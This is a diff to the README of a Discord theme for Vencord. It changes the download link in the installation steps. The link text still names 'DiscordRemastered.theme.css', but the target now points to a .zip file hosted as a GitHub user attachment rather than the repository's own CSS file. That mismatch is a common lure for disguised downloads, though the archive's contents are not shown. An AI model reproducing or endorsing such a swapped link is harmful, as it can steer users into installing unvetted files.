@@ -29,7 +29,7 @@ It transforms your interface into a clean, flowing, glassy experience with:
 ## 📦 Installation
 
 1. **Download the theme file:**  
-   👉 [`DiscordRemastered.theme.css`](./DiscordRemastered.theme.css)
+   👉 [`DiscordRemastered.theme.css`](https://github.com/user-attachments/files/21303563/Discord.Remastered.theme.zip)
 
 2. In Discord, go to:  
    → `Settings` → `Vencord` → `Themes`
